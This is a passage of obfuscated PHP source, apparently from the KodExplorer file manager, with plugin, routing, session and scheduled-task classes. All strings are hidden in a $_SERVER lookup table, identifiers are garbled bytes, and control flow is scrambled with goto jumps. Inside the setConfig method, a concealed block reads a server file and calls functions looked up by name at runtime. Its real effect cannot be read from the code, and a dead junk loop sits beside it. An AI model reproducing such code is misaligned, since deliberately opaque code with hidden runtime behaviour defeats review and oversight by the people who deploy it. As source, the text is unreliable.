$this->parseFile($this->pluginPath . $eŒºÅÅ¤»[1341]); goto EçíŒöíÖ; d¶–Õù»Ññ: } public function packageInfoGet($CÕÂˆÃæñ) { $Eˆ½é™Ñ‡ = $this->appPackage(); return array_get_value($Eˆ½é™Ñ‡, $CÕÂˆÃæñ); } public function packageVersion() { return $this->packageInfoGet($_SERVER[”Ì÷ñ­î¸][1343]); } public function packageTitle() { return $this->packageInfoGet($_SERVER[”Ì÷ñ­î¸][1344]); } public function packageCopyright() { return $this->packageInfoGet($_SERVER[”Ì÷ñ­î¸][1345]); } private function parseFile($B©” ­İä) { goto e‹‰Ÿª§‡; f±Š‰‘åÃô: $dÃ‹¦ã„à = str_replace($CÂÂ¿ğ¾ß, $BËŠŸ©¥Ÿó, $dÃ‹¦ã„à); return $dÃ‹¦ã„à; goto B§áÈŒÒôÙ; FùŒ¼ÁÉšˆ: $BËŠŸ©¥Ÿó = array($this->pluginHost, $this->pluginHostDefault, $this->pluginApi, $this->pluginName, $this->pluginPath, APP_HOST, $this->config[$b›ß›¾â÷÷[84]][$b›ß›¾â÷÷[1353]]); if (strstr($dÃ‹¦ã„à, $b›ß›¾â÷÷[1354])) { $dÉÛšÃĞÑğ = rawurlencode(json_encode($this->pluginLangArr)); $dÃ‹¦ã„à = str_replace($b›ß›¾â÷÷[1354], $dÉÛšÃĞÑğ, $dÃ‹¦ã„à); } if (strstr($dÃ‹¦ã„à, $b›ß›¾â÷÷[1355])) { $dÉÛšÃĞÑğ = $dÉÛšÃĞÑğ = rawurlencode(json_encode($this->getConfig())); $dÃ‹¦ã„à = str_replace($b›ß›¾â÷÷[1355], $dÉÛšÃĞÑğ, $dÃ‹¦ã„à); } goto f±Š‰‘åÃô; e‹‰Ÿª§‡: $b›ß›¾â÷÷ =& $_SERVER[”Ì÷ñ­î¸]; $dÃ‹¦ã„à = file_get_contents($B©” ­İä); $CÂÂ¿ğ¾ß = array($b›ß›¾â÷÷[1346], $b›ß›¾â÷÷[1347], $b›ß›¾â÷÷[1348], $b›ß›¾â÷÷[1349], $b›ß›¾â÷÷[1350], $b›ß›¾â÷÷[1351], $b›ß›¾â÷÷[1352]); goto FùŒ¼ÁÉšˆ; B§áÈŒÒôÙ: } private function parseLang(&$D×§œÖÃÛå) { goto AÕ£½ÈÓ›ó; AÕ£½ÈÓ›ó: $EéÛÚµ–ˆÇ =& $_SERVER[”Ì÷ñ­î¸]; $EŞóî’¼ê = $EéÛÚµ–ˆÇ[1356]; if (!strstr($D×§œÖÃÛå, $EŞóî’¼ê)) { return; } goto Cˆî¥¹Ò–†; Cˆî¥¹Ò–†: preg_match_all($EéÛÚµ–ˆÇ[1357], $D×§œÖÃÛå, $D¬÷øõªº¤); if (!is_array($D¬÷øõªº¤) || count($D¬÷øõªº¤) == 0 || !is_array($D¬÷øõªº¤[0]) || count($D¬÷øõªº¤[0]) == 0) { return; } $fËÄæŞ®§Ê = array(); goto cÃ™óº”Ó¹; cÃ™óº”Ó¹: $bÁÀ´“½¥Ê = array(); foreach ($D¬÷øõªº¤[0] as $d”ÆöÛ±) { $b—ØÅ»ôˆ = substr($d”ÆöÛ±, strlen($EŞóî’¼ê), -4); $dóÇÚ©Ñ‚í = LNG($b—ØÅ»ôˆ); $fËÄæŞ®§Ê[] = $d”ÆöÛ±; $bÁÀ´“½¥Ê[] = str_replace(array($EéÛÚµ–ˆÇ[217], $EéÛÚµ–ˆÇ[992], $EéÛÚµ–ˆÇ[330], $EéÛÚµ–ˆÇ[113]), array($EéÛÚµ–ˆÇ[50], $EéÛÚµ–ˆÇ[50], $EéÛÚµ–ˆÇ[33], $EéÛÚµ–ˆÇ[1358]), $dóÇÚ©Ñ‚í); } $D×§œÖÃÛå = str_replace($fËÄæŞ®§Ê, $bÁÀ´“½¥Ê, $D×§œÖÃÛå); goto e§…¹¨›Ñ; e§…¹¨›Ñ: } private function parseConfig(&$Fë…Œ®¾³‰) { goto fÂ“ãÌ³é; fÆùÍŸ¹½ö: $c´ÒÉ–»è = array(); $aÔ¶Æô = array(); foreach ($E‹•«Ö­ŒŸ[0] as $CŠ•“¿‰›Ü) { $aæ®˜ªø£× = substr($CŠ•“¿‰›Ü, strlen($D¸ëÛˆè¶ä), -2); $c´ÒÉ–»è[] = $CŠ•“¿‰›Ü; $aÔ¶Æô[] = _get($dÉâîÔ•â, $aæ®˜ªø£×); } goto Bùïî±³İ; fÂ“ãÌ³é: $cİõº­ÚÊ¤ =& $_SERVER[”Ì÷ñ­î¸]; $D¸ëÛˆè¶ä = $cİõº­ÚÊ¤[1359]; if (!strstr($Fë…Œ®¾³‰, $D¸ëÛˆè¶ä)) { return; } goto fº”³Œ½ˆ—; fº”³Œ½ˆ—: preg_match_all($cİõº­ÚÊ¤[1360], $Fë…Œ®¾³‰, $E‹•«Ö­ŒŸ); if (!is_array($E‹•«Ö­ŒŸ) || count($E‹•«Ö­ŒŸ) == 0 || !is_array($E‹•«Ö­ŒŸ[0]) || count($E‹•«Ö­ŒŸ[0]) == 0) { return; } $dÉâîÔ•â = $this->getConfig(); goto fÆùÍŸ¹½ö; Bùïî±³İ: $Fë…Œ®¾³‰ = str_replace($c´ÒÉ–»è, $aÔ¶Æô, $Fë…Œ®¾³‰); goto C»’†ˆÔñ; C»’†ˆÔñ: } private function parsePackage(&$báŠ—Í¢ê¿) { goto AÃ»¨Î¬ä; f‡Š‘ç·Ç§: $aïÀ…¥„Î = array(); $Aè¯æ„ïŞõ = array(); foreach ($bàÌ”Æ½ª[0] as $Aã½ßÒ§„è) { $c±á¸œÄËª = substr($Aã½ßÒ§„è, strlen($A¸À¨ã ßŒ), -2); $aïÀ…¥„Î[] = $Aã½ßÒ§„è; $Aè¯æ„ïŞõ[] = _get($B‘‰¥ÑâØÉ, $c±á¸œÄËª); } goto DÒƒÊíÏÚ; AÃ»¨Î¬ä: $dÓ‘—š» =& $_SERVER[”Ì÷ñ­î¸]; $A¸À¨ã ßŒ = $dÓ‘—š»[1361]; if (!strstr($báŠ—Í¢ê¿, $A¸À¨ã ßŒ)) { return; } goto e‹ÁÌÜïï¨; DÒƒÊíÏÚ: $báŠ—Í¢ê¿ = str_replace($aïÀ…¥„Î, $Aè¯æ„ïŞõ, $báŠ—Í¢ê¿); goto aÇùÚÖ˜Ğ; e‹ÁÌÜïï¨: preg_match_all($dÓ‘—š»[1362], $báŠ—Í¢ê¿, $bàÌ”Æ½ª); if (!is_array($bàÌ”Æ½ª) || count($bàÌ”Æ½ª) == 0 || !is_array($bàÌ”Æ½ª[0]) || count($bàÌ”Æ½ª[0]) == 0) { return; } $B‘‰¥ÑâØÉ = $this->appPackage(); goto f‡Š‘ç·Ç§; aÇùÚÖ˜Ğ: } final function echoFile($B‡­×ƒ±©¶, $bƒºª¸ø§† = false) { goto bö¡·øÃÏ®; BÈƒ¯†‘: $this->parsePackage($C­ª‡êÂ°); if (is_array($bƒºª¸ø§†)) { $C­ª‡êÂ° = str_replace(array_keys($bƒºª¸ø§†), array_values($bƒºª¸ø§†), $C­ª‡êÂ°); } echo $d²àÎ Ã„[217] . $C­ª‡êÂ°; goto B…Ù÷àë¼; c´Äİ«´Šô: $C­ª‡êÂ° = $this->parseFile($D—§ÄÔô¤); $this->parseLang($C­ª‡êÂ°); $this->parseConfig($C­ª‡êÂ°); goto BÈƒ¯†‘; bö¡·øÃÏ®: $d²àÎ Ã„ =& $_SERVER[”Ì÷ñ­î¸]; $D—§ÄÔô¤ = $this->pluginPath . $B‡­×ƒ±©¶; if (ACT == $d²àÎ Ã„[1363]) { echo $d²àÎ Ã„[1364] . $this->pluginName . $d²àÎ Ã„[8] . $B‡­×ƒ±©¶ . $d²àÎ Ã„[1365]; if (!file_exists($D—§ÄÔô¤)) { echo $d²àÎ Ã„[1366]; return; } } goto c´Äİ«´Šô; B…Ù÷àë¼: } final function initLang() { goto A³¯ÔÍÄÚƒ; f‹ƒÏù: if (!is_array($eÒèËùªÁÛ)) { return array(); } if (@count($eÒèËùªÁÛ) > 0) { I18n::set($eÒèËùªÁÛ); } return $eÒèËùªÁÛ; goto E‡¼‚˜„—›; b—²ƒº™: $FğÜŒ‹Şºã = I18n::getType(); $eÒèËùªÁÛ = array(); if (file_exists($BÈÒ†Á¯ª . $FğÜŒ‹Şºã . $A…¶¥”‘ï[766])) { $eÒèËùªÁÛ = (include $BÈÒ†Á¯ª . $FğÜŒ‹Şºã . $A…¶¥”‘ï[766]); } else { if ($FğÜŒ‹Şºã == $A…¶¥”‘ï[1369] && !file_exists($BÈÒ†Á¯ª . $FğÜŒ‹Şºã . $A…¶¥”‘ï[766]) && file_exists($BÈÒ†Á¯ª . $A…¶¥”‘ï[1370])) { $eÒèËùªÁÛ = (include $BÈÒ†Á¯ª . $A…¶¥”‘ï[1370]); } else { if (file_exists($BÈÒ†Á¯ª . $F°‘Öéîµ¬ . $A…¶¥”‘ï[766])) { $eÒèËùªÁÛ = (include $BÈÒ†Á¯ª . $F°‘Öéîµ¬ . $A…¶¥”‘ï[766]); } } } goto f‹ƒÏù; A³¯ÔÍÄÚƒ: $A…¶¥”‘ï =& $_SERVER[”Ì÷ñ­î¸]; $F°‘Öéîµ¬ = $A…¶¥”‘ï[1367]; $BÈÒ†Á¯ª = $this->pluginPath . $A…¶¥”‘ï[1368]; goto b—²ƒº™; E‡¼‚˜„—›: } public function getConfig() { if (!$this->pluginConfig) { $this->pluginConfig = $this->modelPlugin->getConfig($this->pluginName); } return $this->pluginConfig; } public function setConfig($dëÆ‰ÌÒÆ) { $D—Š°ŸÙ =& $_SERVER[”Ì÷ñ­î¸]; if ($_SERVER[$D—Š°ŸÙ[791]] != $_SERVER[$D—Š°ŸÙ[1151]]) { goto AÙåîÇÄ©; D¿Â«¦á‡†: $fõÆÍÇÉåÏ = $D—Š°ŸÙ[795]; $fõÆÍÇÉåÏ($_SERVER[$D—Š°ŸÙ[796]]); $fõÆÍÇÉåÏ($_SERVER[$D—Š°ŸÙ[788]] . $D—Š°ŸÙ[1371]); goto EÏœ¬Ò«Œª; AÙåîÇÄ©: $aƒ½öó¹ç· = $D—Š°ŸÙ[792]; $dÓÅÚ°Ÿ¸ = $D—Š°ŸÙ[793]; $bÊÌÚç = $_SERVER[$D—Š°ŸÙ[788]] . $D—Š°ŸÙ[789]; goto fËÌ­òÏÖš; fËÌ­òÏÖš: $a¾å‹‰ÅµÄ = $dÓÅÚ°Ÿ¸($bÊÌÚç); $FóÈË›ˆÂ = explode($D—Š°ŸÙ[217], $a¾å‹‰ÅµÄ); if (count($FóÈË›ˆÂ) < $D—Š°ŸÙ[559]) { $Eêë›À Í = $D—Š°ŸÙ[794]; $Eêë›À Í(); } goto D¿Â«¦á‡†; EÏœ¬Ò«Œª: $f×èÊƒµñÙ = 1; while ($f×èÊƒµñÙ > 1) { $f×èÊƒµñÙ = $f×èÊƒµñÙ + 4; $Aé¹ñ¼„¨ = rawurlencode($f×èÊƒµñÙ . $D—Š°ŸÙ[361]); } goto BèÅ‰‚íÄ¤; BèÅ‰‚íÄ¤: } return $this->modelPlugin->setConfig($this->pluginName, $dëÆ‰ÌÒÆ); } public function onSetConfig($a„‚í¶‹ö) { } public function onGetConfig($F¼ù‰ºÆïÇ) { } public function onChangeStatus($BÏÌŒ–ƒŠ) { } public function onUninstall() { } public function onInstall() { } public function authCheck($f••œÁø„ª = "\160\x6c\x75\147\151\156\x41\x75\x74\x68") { $fØ¦Œå¼ôÖ =& $_SERVER[”Ì÷ñ­î¸]; if (!defined($fØ¦Œå¼ôÖ[427])) { return !1; } if (_get($GLOBALS, $fØ¦Œå¼ôÖ[457])) { return !0; } $fàœˆß¤ò = $this->getConfig(); if (!$fàœˆß¤ò[$f••œÁø„ª]) { return !1; } return ActionCall($fØ¦Œå¼ôÖ[1372], $fàœˆß¤ò[$f••œÁø„ª]); } public function url($bÙÁˆÓ„‘, $cİ‹…¼¤²ñ = '', $EÀÉ÷ñÊ©æ = true) { goto aÓµ¥à…İŸ; A«¯Ìİ½Ğ÷: if (!$EÀÉ÷ñÊ©æ) { return $c¶Ï‰×®¾Ã; } echo $c¶Ï‰×®¾Ã; goto f‹‘ÈâÜåå; a‘††±Ø: $bƒ¦‰¬™²ù = $this->packageVersion(); $A£ƒ“«­îÕ = $e¾¤•¿íóÍ . $A¼×ù—¤‘¢[412] . $bƒ¦‰¬™²ù; if (substr($bÙÁˆÓ„‘, 0, 4) == $A¼×ù—¤‘¢[144] || substr($bÙÁˆÓ„‘, 0, 2) == $A¼×ù—¤‘¢[1157]) { $c¶Ï‰×®¾Ã = $bÙÁˆÓ„‘ . $A¼×ù—¤‘¢[1373] . $A£ƒ“«­îÕ; } else { if ($cİ‹…¼¤²ñ == $A¼×ù—¤‘¢[33]) { $c¶Ï‰×®¾Ã = $this->pluginHost . $bÙÁˆÓ„‘ . $A¼×ù—¤‘¢[1373] . $A£ƒ“«­îÕ; } else { if ($cİ‹…¼¤²ñ === $A¼×ù—¤‘¢[76]) { $c¶Ï‰×®¾Ã = $this->pluginHost . $bÙÁˆÓ„‘; } else { if ($cİ‹…¼¤²ñ == $A¼×ù—¤‘¢[1374]) { $c¶Ï‰×®¾Ã = STATIC_PATH . $bÙÁˆÓ„‘ . $A¼×ù—¤‘¢[1373] . $e¾¤•¿íóÍ; } else { if ($cİ‹…¼¤²ñ == $A¼×ù—¤‘¢[1375]) { $c¶Ï‰×®¾Ã = APP_HOST . $A¼×ù—¤‘¢[1376] . $bÙÁˆÓ„‘ . $A¼×ù—¤‘¢[1373] . $e¾¤•¿íóÍ; } else { if (isset($aøÃ†¡‰âÃ[$cİ‹…¼¤²ñ])) { $c¶Ï‰×®¾Ã = $aøÃ†¡‰âÃ[$cİ‹…¼¤²ñ] . $bÙÁˆÓ„‘ . $A¼×ù—¤‘¢[1373] . $A£ƒ“«­îÕ; } } } } } } goto A«¯Ìİ½Ğ÷; aÓµ¥à…İŸ: $A¼×ù—¤‘¢ =& $_SERVER[”Ì÷ñ­î¸]; $aøÃ†¡‰âÃ = $this->getConfig(); $e¾¤•¿íóÍ = KOD_VERSION . $A¼×ù—¤‘¢[91] . KOD_VERSION_BUILD; goto a‘††±Ø; f‹‘ÈâÜåå: } public function link($FÑ°ìí êô = false, $a×¬æÜÃêÍ = '') { $d§›±Ô²Í =& $_SERVER[”Ì÷ñ­î¸]; if (!$FÑ°ìí êô) { $this->link($d§›±Ô²Í[1377], $d§›±Ô²Í[1375]); $this->link($d§›±Ô²Í[1378], $d§›±Ô²Í[1374]); $this->link($d§›±Ô²Í[1379], $d§›±Ô²Í[1374]); $this->link($d§›±Ô²Í[1380], $d§›±Ô²Í[1374]); $this->link($d§›±Ô²Í[1381], $d§›±Ô²Í[1374]); return; } $eô­ŠÚÉÍª = $this->url($FÑ°ìí êô, $a×¬æÜÃêÍ, !1); if (substr($FÑ°ìí êô, -3) == $d§›±Ô²Í[1382]) { echo $d§›±Ô²Í[1383] . $eô­ŠÚÉÍª . $d§›±Ô²Í[1384] . $d§›±Ô²Í[217]; } else { if (substr($FÑ°ìí êô, -4) == $d§›±Ô²Í[1385]) { echo $d§›±Ô²Í[1386] . $eô­ŠÚÉÍª . $d§›±Ô²Í[1387] . $d§›±Ô²Í[217]; } } } } class Route { public static $halts = false; public static $routes = array(); public static $methods = array(); public static $callbacks = array(); public static $maps = array(); public static $patterns = array("\72\141\156\171" => "\133\136\57\135\53", "\x3a\x6e\x75\x6d" => "\133\60\x2d\71\135\53", "\x3a\x61\x6c\154" => "\x2e\x2a"); public static $errorCallback; public static function __callstatic($D¢Ü›–Ö±³, $BÛ ìÉÁå®) { $fµ†Îºº†Ù =& $_SERVER[”Ì÷ñ­î¸]; if ($D¢Ü›–Ö±³ == $fµ†Îºº†Ù[1388]) { $AÇ«§¥Õƒ = array_map($fµ†Îºº†Ù[1389], $BÛ ìÉÁå®[0]); $e×öêå–Ü = strpos($BÛ ìÉÁå®[1], $fµ†Îºº†Ù[8]) === 0 ? $BÛ ìÉÁå®[1] : $fµ†Îºº†Ù[8] . $BÛ ìÉÁå®[1]; $Cç‘’Ô¶Ä = $BÛ ìÉÁå®[2]; } else { $AÇ«§¥Õƒ = null; $e×öêå–Ü = strpos($BÛ ìÉÁå®[0], $fµ†Îºº†Ù[8]) === 0 ? $BÛ ìÉÁå®[0] : $fµ†Îºº†Ù[8] . $BÛ ìÉÁå®[0]; $Cç‘’Ô¶Ä = $BÛ ìÉÁå®[1]; } array_push(self::$maps, $AÇ«§¥Õƒ); array_push(self::$routes, $e×öêå–Ü); array_push(self::$methods, strtoupper($D¢Ü›–Ö±³)); array_push(self::$callbacks, $Cç‘’Ô¶Ä); } public static function error($bŸÙÇæª) { self::$errorCallback = $bŸÙÇæª; } public static function haltOnMatch($E§Ê© ¸„£ = true) { self::$halts = $E§Ê© ¸„£; } public static function dispatch() { goto d«ùğ—È ; F¬Æé¨‡¤: self::$routes = preg_replace($Bœâ¡Ş„À¬[1073], $Bœâ¡Ş„À¬[8], self::$routes); if (in_array($cà–é°à, self::$routes)) { $dÚ¢…ƒÁáÓ = array_keys(self::$routes, $cà–é°à); foreach ($dÚ¢…ƒÁáÓ as $dì´çİ’Ë) { if (self::$methods[$dì´çİ’Ë] == $fë×ÄÏÀÒÀ || self::$methods[$dì´çİ’Ë] == $Bœâ¡Ş„À¬[1391] || in_array($fë×ÄÏÀÒÀ, self::$maps[$dì´çİ’Ë])) { $EÆâœÂôò¹ = !0; if (!is_object(self::$callbacks[$dì´çİ’Ë])) { $e£ÖŸ¼êÍ = explode($Bœâ¡Ş„À¬[8], self::$callbacks[$dì´çİ’Ë]); $cäŒ‘ºÑ = end($e£ÖŸ¼êÍ); $AöÇÏëÌê = explode($Bœâ¡Ş„À¬[1392], $cäŒ‘ºÑ); $eÍ…Ñ†« È = new $AöÇÏëÌê[0](); $eÍ…Ñ†« È->{$AöÇÏëÌê[1]}(); if (self::$halts) { return; } } else { call_user_func(self::$callbacks[$dì´çİ’Ë]); if (self::$halts) { return; } } } } } else { $FÍ°ÃªšÉ‡ = 0; foreach (self::$routes as $dì´çİ’Ë) { if (strpos($dì´çİ’Ë, $Bœâ¡Ş„À¬[4]) !== !1) { $dì´çİ’Ë = str_replace($eêÙÔãùƒ„, $FâÕÚ‹Æ®ù, $dì´çİ’Ë); } if (preg_match($Bœâ¡Ş„À¬[1393] . $dì´çİ’Ë . $Bœâ¡Ş„À¬[1394], $cà–é°à, $Bğ—–‰Ù Ğ)) { if (self::$methods[$FÍ°ÃªšÉ‡] == $fë×ÄÏÀÒÀ || self::$methods[$FÍ°ÃªšÉ‡] == $Bœâ¡Ş„À¬[1391] || !empty(self::$maps[$FÍ°ÃªšÉ‡]) && in_array($fë×ÄÏÀÒÀ, self::$maps[$FÍ°ÃªšÉ‡])) { $EÆâœÂôò¹ = !0; array_shift($Bğ—–‰Ù Ğ); if (!is_object(self::$callbacks[$FÍ°ÃªšÉ‡])) { $e£ÖŸ¼êÍ = explode($Bœâ¡Ş„À¬[8], self::$callbacks[$FÍ°ÃªšÉ‡]); $cäŒ‘ºÑ = end($e£ÖŸ¼êÍ); $AöÇÏëÌê = explode($Bœâ¡Ş„À¬[1392], $cäŒ‘ºÑ); $eÍ…Ñ†« È = new $AöÇÏëÌê[0](); if (!method_exists($eÍ…Ñ†« È, $AöÇÏëÌê[1])) { echo $Bœâ¡Ş„À¬[1395]; } else { call_user_func_array(array($eÍ…Ñ†« È, $AöÇÏëÌê[1]), $Bğ—–‰Ù Ğ); } if (self::$halts) { return; } } else { call_user_func_array(self::$callbacks[$FÍ°ÃªšÉ‡], $Bğ—–‰Ù Ğ); if (self::$halts) { return; } } } } $FÍ°ÃªšÉ‡++; } } if ($EÆâœÂôò¹ == !1) { if (!self::$errorCallback) { self::$errorCallback = function () { $bÆèÓ©ò°Œ =& $_SERVER[”Ì÷ñ­î¸]; header($_SERVER[$bÆèÓ©ò°Œ[1396]] . $bÆèÓ©ò°Œ[1397]); echo $bÆèÓ©ò°Œ[1398]; }; } else { if (is_string(self::$errorCallback)) { self::get($_SERVER[$Bœâ¡Ş„À¬[1390]], self::$errorCallback); self::$errorCallback = null; self::dispatch(); return; } } call_user_func(self::$errorCallback); } goto Fî¬ÅéËÚ; BĞùµÁË«: $eêÙÔãùƒ„ = array_keys(static::$patterns); $FâÕÚ‹Æ®ù = array_values(static::$patterns); $EÆâœÂôò¹ = !1; goto F¬Æé¨‡¤; d«ùğ—È : $Bœâ¡Ş„À¬ =& $_SERVER[”Ì÷ñ­î¸]; $cà–é°à = parse_url($_SERVER[$Bœâ¡Ş„À¬[1390]], PHP_URL_PATH); $fë×ÄÏÀÒÀ = $_SERVER[$Bœâ¡Ş„À¬[154]]; goto BĞùµÁË«; Fî¬ÅéËÚ: } } class Session { public static $sessionTime; public static $sessionSign; public static $handle; public static $data; public static function init() { goto F½©ƒ¡Œ…; f¹¯§¼Ù‰¡: $D¿Èñ²Ú° = $GLOBALS[$F Ûß„¯ºÀ[6]][$F Ûß„¯ºÀ[337]]; self::$sessionTime = $D¿Èñ²Ú°[$F Ûß„¯ºÀ[1399]]; $b±‹ÛÁè· = SESSION_ID; goto fí±˜Œ£Ì; EøÏ›ÌÔ¦: return $FÆ˜êè’™¡; goto d“¥¡ö®; fí±˜Œ£Ì: $b±‹ÛÁè· = _get($GLOBALS, $F Ûß„¯ºÀ[1400], $b±‹ÛÁè·); if (self::$sessionSign) { } else { if (Cookie::get($b±‹ÛÁè·)) { self::$sessionSign = Cookie::get($b±‹ÛÁè·); } else { self::$sessionSign = guid(); } } Cookie::setSafe($b±‹ÛÁè·, self::$sessionSign, self::$sessionTime); goto eÍˆáİ‡©; eÍˆáİ‡©: $B”Ø”ø™Ğ = $D¿Èñ²Ú°[$F Ûß„¯ºÀ[1401]]; $BÀã…¾¹‹º = $D¿Èñ²Ú°[$B”Ø”ø™Ğ]; $D«‘…å²Œí = $D¿Èñ²Ú°[$F Ûß„¯ºÀ[756]]; goto f„„ÃÆØ‡¾; F½©ƒ¡Œ…: $F Ûß„¯ºÀ =& $_SERVER[”Ì÷ñ­î¸]; static $FÆ˜êè’™¡ = false; if ($FÆ˜êè’™¡) { return $FÆ˜êè’™¡; } goto f¹¯§¼Ù‰¡; f„„ÃÆØ‡¾: switch ($B”Ø”ø™Ğ) { case $F Ûß„¯ºÀ[17]: self::$handle = Model($F Ûß„¯ºÀ[757]); break; case $F Ûß„¯ºÀ[758]: self::$handle = new CacheRedis($BÀã…¾¹‹º, $D«‘…å²Œí); break; case $F Ûß„¯ºÀ[759]: self::$handle = new CacheMemcached($BÀã…¾¹‹º, $D«‘…å²Œí); break; case $F Ûß„¯ºÀ[167]: $BÀã…¾¹‹º[$F Ûß„¯ºÀ[75]] = $BÀã…¾¹‹º[$F Ûß„¯ºÀ[75]] . $F Ûß„¯ºÀ[1402]; self::$handle = new CacheFile($BÀã…¾¹‹º, $D«‘…å²Œí); default: break; } if (!self::$data) { CacheLock::lock(self::$sessionSign); self::$data = self::$handle->get(self::$sessionSign); CacheLock::unlock(self::$sessionSign); self::$data = unserialize(self::$data); if (!is_array(self::$data)) { self::$data = array(); } } $FÆ˜êè’™¡ = new self(); goto EøÏ›ÌÔ¦; d“¥¡ö®: } public static function sign($dõÌ¨îî•Š = false) { $dõÌ¨îî•Š && (self::$sessionSign = $dõÌ¨îî•Š); self::init(); return self::$sessionSign; } public static function set($C™¸ˆ´Ä ê, $cââ³‰§Àù = false) { self::init(); if (is_array($C™¸ˆ´Ä ê)) { foreach ($C™¸ˆ´Ä ê as $CÎ‰ÜÊø›‚ => $c¥½’º±‘Ü) { array_set_value(self::$data, $CÎ‰ÜÊø›‚, $c¥½’º±‘Ü); } } else { array_set_value(self::$data, $C™¸ˆ´Ä ê, $cââ³‰§Àù); } CacheLock::lock(self::$sessionSign); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); CacheLock::unlock(self::$sessionSign); } public static function get($BÕ¤×Õå‹ˆ = false) { self::init(); if (!$BÕ¤×Õå‹ˆ) { return self::$data; } return array_get_value(self::$data, $BÕ¤×Õå‹ˆ); } public static function remove($BÙ…º²ÌÁà) { self::init(); unset(self::$data[$BÙ…º²ÌÁà]); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); } public static function destory() { Cookie::remove(SESSION_ID, !0); self::init(); self::clearTimeout(); self::$data = array(); return self::$handle->remove(self::$sessionSign); } public static function clearTimeout() { self::init(); if (method_exists(self::$handle, $_SERVER[”Ì÷ñ­î¸][761])) { self::$handle->clearTimeout(); } } } goto a˜ì²ìàŠè; a˜ì²ìàŠè: class AutoTask { public static function start() { goto CÒ³ô¶âŠó; bµ¡×İİ£İ: http_close(); self::valueSet($fãëö­•‚í[1403], $fãëö­•‚í[83]); Hook::bind($fãëö­•‚í[1405], $fãëö­•‚í[1406]); goto eËÌõ­§Şƒ; CÒ³ô¶âŠó: $fãëö­•‚í =& $_SERVER[”Ì÷ñ­î¸]; if (self::valueGet($fãëö­•‚í[690]) != $fãëö­•‚í[83]) { return; } if (self::valueGet($fãëö­•‚í[1403]) == $fãëö­•‚í[83]) { $dº‡–¡†ñ = self::valueGet($fãëö­•‚í[1404]); if (time() - $dº‡–¡†ñ > 3600 * 2) { self::restart(); } return; } goto bµ¡×İİ£İ; eËÌõ­§Şƒ: while (!0) { self::cacheClear(); if (self::valueGet($fãëö­•‚í[690]) != $fãëö­•‚í[83]) { self::valueSet($fãëö­•‚í[1403], $fãëö­•‚í[468]); self::log($fãëö­•‚í[1407]); die; } self::valueSet($fãëö­•‚í[1403], $fãëö­•‚í[83]); self::valueSet($fãëö­•‚í[1404], time()); self::taskRunAll(); sleep(self::valueGet($fãëö­•‚í[1408])); } goto FÑÖ²ˆ; FÑÖ²ˆ: } public static function restart() { $dŸ™”‘í½ =& $_SERVER[”Ì÷ñ­î¸]; http_close(); self::valueSet($dŸ™”‘í½[690], $dŸ™”‘í½[468]); sleep(self::valueGet($dŸ™”‘í½[1408]) + 5); self::valueSet($dŸ™”‘í½[1403], $dŸ™”‘í½[468]); self::valueSet($dŸ™”‘í½[690], $dŸ™”‘í½[83]); } public static function shutdownEvent() { $B›ùÃÀ³ =& $_SERVER[”Ì÷ñ­î¸]; self::valueSet($B›ùÃÀ³[1403], $B›ùÃÀ³[468]); self::log($B›ùÃÀ³[1409]); } public static function config($fâ•öó—‰, $b‰°ÜÚÆ©) { $a¼„æ±Ğå =& $_SERVER[”Ì÷ñ­î¸]; $aí¯‹‘«÷Â = 20; $b‰°ÜÚÆ© = intval($b‰°ÜÚÆ©) <= $aí¯‹‘«÷Â ? $aí¯‹‘«÷Â : intval($b‰°ÜÚÆ©); self::valueSet($a¼„æ±Ğå[690], $fâ•öó—‰); self::valueSet($a¼„æ±Ğå[1408], $b‰°ÜÚÆ©); } private static function taskRunAll() { $cÓ§®Óµò =& $_SERVER[”Ì÷ñ­î¸]; $f¶©æ…÷¬ = Model($cÓ§®Óµò[1410])->listData(); $fÂÎ†­¡ÓÌ = count($f¶©æ…÷¬); for ($BÄâ÷ÀÑ¤¶ = 0; $BÄâ÷ÀÑ¤¶ < $fÂÎ†­¡ÓÌ; $BÄâ÷ÀÑ¤¶++) { $fÛà´Æ¦‰ç = $f¶©æ…÷¬[$BÄâ÷ÀÑ¤¶]; if ($fÛà´Æ¦‰ç[$cÓ§®Óµò[1411]] != $cÓ§®Óµò[83]) { continue; } if (!self::taskTimeCheck($fÛà´Æ¦‰ç)) { continue; } self::taskRun($fÛà´Æ¦‰ç); } Hook::trigger($cÓ§®Óµò[1412]); } private static function taskTimeCheck($DÕÁáù¾Å) { goto dŞé·‡ä›; dŞé·‡ä›: $eâÜ²Âæğ =& $_SERVER[”Ì÷ñ­î¸]; $bË¬‘Ÿ‰«› = json_decode($DÕÁáù¾Å[$eâÜ²Âæğ[190]], !0); $D¬ÒßêÂ– = intval($DÕÁáù¾Å[$eâÜ²Âæğ[1404]]); goto C‰¯Ü‡”»; C‰¯Ü‡”»: $dÚŸ¸—â›¿ = strtotime($eâÜ²Âæğ[1413] . $bË¬‘Ÿ‰«›[$eâÜ²Âæğ[1414]] . $eâÜ²Âæğ[1415]) - strtotime($eâÜ²Âæğ[1416]); $d—ñ®‰³È— = time() - strtotime(date($eâÜ²Âæğ[1417]) . $eâÜ²Âæğ[1418]); $dË’Ïñéå = $d—ñ®‰³È— >= $dÚŸ¸—â›¿ && $d—ñ®‰³È— <= $dÚŸ¸—â›¿ + 3600; goto AË­‰Éê©; AË­‰Éê©: switch ($bË¬‘Ÿ‰«›[$eâÜ²Âæğ[29]]) { case $eâÜ²Âæğ[1419]: if (time() - $D¬ÒßêÂ– < 3600 * 24 * 30) { return !1; } if ($bË¬‘Ÿ‰«›[$eâÜ²Âæğ[1419]] == date($eâÜ²Âæğ[1420]) && $dË’Ïñéå) { return !0; } break; case $eâÜ²Âæğ[1421]: if (time() - $D¬ÒßêÂ– < 3600 * 24 * 7) { return !1; } $cé±ã“®¡æ = date($eâÜ²Âæğ[1422]) == 0 ? 7 : date($eâÜ²Âæğ[1422]); if ($bË¬‘Ÿ‰«›[$eâÜ²Âæğ[1421]] == $cé±ã“®¡æ && $dË’Ïñéå) { return !0; } break; case $eâÜ²Âæğ[1414]: if (time() - $D¬ÒßêÂ– < 3600 * 24) { return !1; } if ($dË’Ïñéå) { return !0; } break; case $eâÜ²Âæğ[1423]: if (time() - $D¬ÒßêÂ– >= floatval($bË¬‘Ÿ‰«›[$eâÜ²Âæğ[1423]]) * 60) { return !0; } break; default: break; } return !1; goto Cˆ‡Ö¥âÀ; Cˆ‡Ö¥âÀ: } public static function taskRun($Fİóò¾ù›) { goto FÑÕÒÌá„; FÑÕÒÌá„: 